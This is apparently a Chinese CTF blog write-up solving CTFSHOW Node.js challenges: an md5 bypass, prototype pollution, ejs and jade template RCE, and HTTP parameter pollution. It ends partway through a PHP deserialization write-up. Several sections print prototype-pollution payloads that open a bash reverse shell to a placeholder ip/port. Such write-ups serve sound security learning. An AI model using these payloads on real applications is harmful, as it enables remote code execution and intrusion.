&#123;</span><br><span class="line">  <span class="keyword">return</span> crypto.<span class="title function_">createHash</span>(<span class="string">&#x27;md5&#x27;</span>)</span><br><span class="line">    .<span class="title function_">update</span>(s)</span><br><span class="line">    .<span class="title function_">digest</span>(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page. */</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;xxxxxxx&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> a = req.<span class="property">query</span>.<span class="property">a</span>;</span><br><span class="line">  <span class="keyword">var</span> b = req.<span class="property">query</span>.<span class="property">b</span>;</span><br><span class="line">  <span class="keyword">if</span>(a &amp;&amp; b &amp;&amp; a.<span class="property">length</span>===b.<span class="property">length</span> &amp;&amp; a!==b &amp;&amp; <span class="title function_">md5</span>(a+flag)===<span class="title function_">md5</span>(b+flag))&#123;</span><br><span class="line">  res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>,&#123; <span class="attr">msg</span>: <span class="string">&#x27;tql&#x27;</span>&#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure><p>利用数组进行绕过</p><p><code>payload: ?a[x]=1&amp;b[x]=2</code></p><h1 id="web338-原型链污染"><a href="#web338-原型链污染" class="headerlink" title="web338(原型链污染)"></a>web338(原型链污染)</h1><p>直接给了源码，不要白不要，打开看看，发现可能有用的js文件：<code>common.js、login.js</code></p><p><strong>common.js</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">copy</span>:copy</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">copy</span>(<span class="params">object1, object2</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> object2) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> object2 &amp;&amp; key <span class="keyword">in</span> object1) &#123;</span><br><span class="line">            <span class="title function_">copy</span>(object1[key], object2[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            object1[key] = object2[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><strong>login.js</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">var</span> utils = <span class="built_in">require</span>(<span class="string">&#x27;../utils/common&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page.  */</span></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_">json</span>(),<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> secert = &#123;&#125;;</span><br><span class="line">  <span class="keyword">var</span> sess = req.<span class="property">session</span>;</span><br><span class="line">  <span class="keyword">let</span> user = &#123;&#125;;</span><br><span class="line">  utils.<span class="title function_">copy</span>(user,req.<span class="property">body</span>);</span><br><span class="line">  <span class="keyword">if</span>(secert.<span class="property">ctfshow</span>===<span class="string">&#x27;36dboy&#x27;</span>)&#123;</span><br><span class="line">    res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">2</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;登录失败&#x27;</span>+<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(user)&#125;);  </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure><p>可以发现，这是个原型链污染，copy很像merge</p><p>如果<code>secert.ctfshow===&#39;36dboy&#39;</code>那就能得到flag</p><p>secert类为空，直接继承了Object类，user也是</p><p>所以secert类中没有ctfshow，我们可以通过user污染Object类，在Object类里面加一个ctfshow</p><p>判断<code>secert.ctfshow===&#39;36dboy&#39;</code>时，找不到ctfshow，会从Object里面找。<br>构造payload：<code>&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;ctfshow&quot;: &quot;36dboy&quot;&#125;&#125;</code></p><p>打开环境，发现是个登陆界面：</p><p><img src="/img/CTFSHOW-Nodejs/338.png" alt=""></p><p>页面输入不了，利用bp</p><p>将数据包的post数据换成我们构造的数据，发包，得到flag：</p><p><img src="/img/CTFSHOW-Nodejs/338_02.png" alt=""></p><h1 id="web339-原型链污染"><a href="#web339-原型链污染" class="headerlink" title="web339(原型链污染)"></a>web339(原型链污染)</h1><p>查看源码：</p><p><strong>common.js</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">copy</span>:copy</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">copy</span>(<span class="params">object1, object2</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> object2) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> object2 &amp;&amp; key <span class="keyword">in</span> object1) &#123;</span><br><span class="line">            <span class="title function_">copy</span>(object1[key], object2[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            object1[key] = object2[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><strong>api.js</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//使用 Express 框架的路由文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//在这部分代码中，首先引入了 express 模块，然后创建了一个路由对象 router。</span></span><br><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="comment">//引入了一个名为 utils（var utils） 的自定义工具模块。</span></span><br><span class="line"><span class="keyword">var</span> utils = <span class="built_in">require</span>(<span class="string">&#x27;../utils/common&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page.  */</span></span><br><span class="line"><span class="comment">//通过 router.post() 方法定义了一个 POST 请求的处理函数，路径为 &#x27;/&#x27;。</span></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_">json</span>(),<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  <span class="comment">//通过 res.type(&#x27;html&#x27;) 设置响应的内容类型为 HTML。</span></span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="comment">//然后，通过 res.render() 方法渲染名为 &#x27;api&#x27; 的视图模板，并传递一个包含 query 属性的对象作为参数。这里使用了 Function(query) 来创建一个函数，并立即调用该函数并传递 query 作为参数。这样做可能是为了在视图模板中使用 query 变量。</span></span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;api&#x27;</span>, &#123; <span class="attr">query</span>: <span class="title class_">Function</span>(query)(query)&#125;);       <span class="comment">//函数名query，参数query</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//通过 module.exports 将 router 对象导出，以便在其他文件中引入和使用。</span></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>login.js</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">var</span> utils = <span class="built_in">require</span>(<span class="string">&#x27;../utils/common&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">User</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">username</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">password</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">normalUser</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">user</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page.  */</span></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_">json</span>(),<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> secert = &#123;&#125;;</span><br><span class="line">  <span class="keyword">var</span> sess = req.<span class="property">session</span>;</span><br><span class="line">  <span class="keyword">let</span> user = &#123;&#125;;</span><br><span class="line">  utils.<span class="title function_">copy</span>(user,req.<span class="property">body</span>);</span><br><span class="line">  <span class="keyword">if</span>(secert.<span class="property">ctfshow</span>===flag)&#123;</span><br><span class="line">    res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">2</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;登录失败&#x27;</span>+<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(user)&#125;);  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure><p>与上题不同的是，上一题判断语句是<code>if(secert.ctfshow= = =‘36dboy’)</code>，这题是<code>if(secert.ctfshow= = =flag)</code>，但是变量flag的值我们不知道，所以不能使用上一题的payload污染原型修改secert.ctfshow</p><p>通过 <code>login.js</code> 里的 <code>utils.copy(user,req.body);</code> 污染原型，然后访问 api 的时候由于 <code>query</code>未定义，所以会向其原型找，那么通过污染原型构造恶意代码即可rce</p><p>原型污染以后 <code>login.js</code> 就不能正常运行了，所以payload使用反弹shell</p><p>构造payload：</p><p><code>&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\&quot;&#39;)&quot;&#125;&#125;</code></p><p>监听端口：<code>nc -lvp port</code></p><p>先在<code>/login</code>页面POST一下进行变量覆盖，再在<code>/api</code>界面直接POST访问即可</p><p><img src="/img/CTFSHOW-Nodejs/339.png" alt=""></p><h1 id="web340-二次污染"><a href="#web340-二次污染" class="headerlink" title="web340(二次污染)"></a>web340(二次污染)</h1><p>看源码</p><p><strong>login.js</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">var</span> utils = <span class="built_in">require</span>(<span class="string">&#x27;../utils/common&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page.  */</span></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_">json</span>(),<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> user = <span class="keyword">new</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">userinfo</span> = <span class="keyword">new</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isVIP</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isAdmin</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isAuthor</span> = <span class="literal">false</span>;     </span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line">  utils.<span class="title function_">copy</span>(user.<span class="property">userinfo</span>,req.<span class="property">body</span>);</span><br><span class="line">  <span class="keyword">if</span>(user.<span class="property">userinfo</span>.<span class="property">isAdmin</span>)&#123;</span><br><span class="line">   res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">2</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;登录失败&#x27;</span>&#125;);  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure><p><code>user.userinfo.isAdmin</code>原本就存在，不会向上找，修改<code>Object.isAdmin</code>无用。</p><p>上一题从secert对象进行污染，secert对象上一级就是object，所以污染一次就行了。</p><p>这一题从userinfo对象进行污染，userinfo对象上一级是user对象，user对象上一级就是object，所以需要污染两次。</p><p>payload：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;query&quot;</span>:<span class="string">&quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\&quot;&#x27;)&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>接下来的操作同上，利用过滤器找到flag：</p><p><img src="/img/CTFSHOW-Nodejs/340.png" alt=""></p><h1 id="web341-ejs模板引擎"><a href="#web341-ejs模板引擎" class="headerlink" title="web341(ejs模板引擎)"></a>web341(ejs模板引擎)</h1><p><a href="https://evi0s.com/2019/08/30/expresslodashejs-从原型链污染到rce/">Express+lodash+ejs: 从原型链污染到RCE - evi0s’ Blog</a></p><ul><li>利用ejs rce，原理是： opts 对象 outputFunctionName 成员在 express 配置的时候并没有给他赋值，默认也是未定义，即 undefined </li><li>但是在有原型链污染的前提之下，可以控制基类的成员，给 Object 类创建一个成员 outputFunctionName ，这样可以进入 if 语句，并将我们控制的成员 outputFunctionName 赋值为一串恶意代码，从而造成代码注入，在后面模版渲染的时候，注入 的代码被执行</li></ul><p>payload：</p><p><code>&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;: &#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\&quot;&#39;);var __tmp2&quot;&#125;&#125;</code></p><p>操作同上，在环境变量中找到flag：</p><p><img src="/img/CTFSHOW-Nodejs/341.png" alt=""></p><h1 id="web342-jade原型链污染"><a href="#web342-jade原型链污染" class="headerlink" title="web342(jade原型链污染)"></a>web342(jade原型链污染)</h1><p><a href="https://lonmar.cn/2021/02/22/几个node模板引擎的原型链污染分析/">几个node模板引擎的原型链污染分析 | L0nm4r (lonmar.cn)</a></p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:</span><br><span class="line">&#123;&quot;type&quot;:&quot;Block&quot;,&quot;nodes&quot;:&quot;&quot;,&quot;compileDebug&quot;:1,&quot;self&quot;:1,&quot;line&quot;:&quot;global.process.mainModule.require(&#x27;child</span><br><span class="line">_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\&quot;&#x27;)&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>改<code>Content-Type: application/json</code></p><h1 id="web343-过滤"><a href="#web343-过滤" class="headerlink" title="web343(过滤)"></a>web343(过滤)</h1><p>题目描述说342基础上增加了过滤</p><p>但是payload还是不变，同342。</p><h1 id="web344-HTTP参数污染"><a href="#web344-HTTP参数污染" class="headerlink" title="web344(HTTP参数污染)"></a>web344(HTTP参数污染)</h1><p>直接给了源码。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag = <span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span>(req.<span class="property">url</span>.<span class="title function_">match</span>(<span class="regexp">/8c|2c|\,/ig</span>))&#123;</span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">&#x27;where is flag :)&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span> query = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(req.<span class="property">query</span>.<span class="property">query</span>);</span><br><span class="line">  <span class="keyword">if</span>(query.<span class="property">name</span>===<span class="string">&#x27;admin&#x27;</span>&amp;&amp;query.<span class="property">password</span>===<span class="string">&#x27;ctfshow&#x27;</span>&amp;&amp;query.<span class="property">isVIP</span>===<span class="literal">true</span>)&#123;</span><br><span class="line">  res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">&#x27;where is flag. :)&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><code>if(query.name===&#39;admin&#39;&amp;&amp;query.password===&#39;ctfshow&#39;&amp;&amp;query.isVIP===true)</code>进行了判断，满足条件就返回flag。</p><p><code>var query = JSON.parse(req.query.query)</code>表示query对象是由get请求传入的json字符串</p><p>payload：<br><code>?query=&#123;&quot;name&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;ctfshow&quot;,&quot;isVIP&quot;:true&#125;</code></p><p>但是题目过滤了逗号和2c（%2c是逗号的url编码），所以我们用&amp;替换逗号。Nodejs中会把这三部分拼接起来。</p><p><code>?query=&#123;&quot;name&quot;:&quot;admin&quot;&amp;query=&quot;password&quot;:&quot;ctfshow&quot;&amp;query=&quot;isVIP&quot;:true&#125;</code></p><p>但是传入payload之后却没有回显flag</p><p>因为双引号的url编码是%22再和c连接起来就是%22c，会匹配到正则表达式。</p><p>所以我们传入的时候，把payload中的c手动url编码一次。</p><p>最终payload：</p><p><code>?query=&#123;&quot;name&quot;:&quot;admin&quot;&amp;query=&quot;password&quot;:&quot;%63tfshow&quot;&amp;query=&quot;isVIP&quot;:true&#125;</code></p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Nodejs </tag>
            
            <tag> CTFSHOW </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP反序列化-wp</title>
      <link href="/2023/08/03/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-wp/"/>
      <url>/2023/08/03/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-wp/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="SWPUCTF-2021-新生赛-pop"><a href="#SWPUCTF-2021-新生赛-pop" class="headerlink" title="[SWPUCTF 2021 新生赛]pop"></a>[SWPUCTF 2021 新生赛]pop</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w44m</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$admin</span> = <span class="string">&#x27;aaa&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$passwd</span> = <span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Getflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;admin === <span class="string">&#x27;w44m&#x27;</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;passwd ===<span class="string">&#x27;08067&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;admin;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;passwd;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;nono&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w22m</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;w00m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w33m</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w22m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;w00m-&gt;&#123;<span class="variable language_">$this</span>-&gt;w22m&#125;();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$w00m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;w00m&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$w00m</span>);</span><br></pre></td></tr></table></figure><p>查看源码发现，要想输出flag，需要满足两个条件：</p><ul><li><p><code>$this-&gt;admin === &#39;w44m&#39; &amp;&amp; $this-&gt;passwd ===&#39;08067&#39;</code></p></li><li><p>调用<code>Getflag</code>方法</p></li></ul><p>发现<code>w33m</code>类中可以通过<code>__toString()</code>魔术方法间接调用<code>Getflag()</code>方法，而想要触发<code>__toString()</code>方法，则需要利用<code>w22m</code>中的<code>__destruct()</code>方法，至此pop链就出来了</p><p><code>w22m-&gt;w33m-&gt;w44m</code></p><p>构造paylaod：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class w44m&#123;</span><br><span class="line">    private $admin = &#x27;w44m&#x27;;</span><br><span 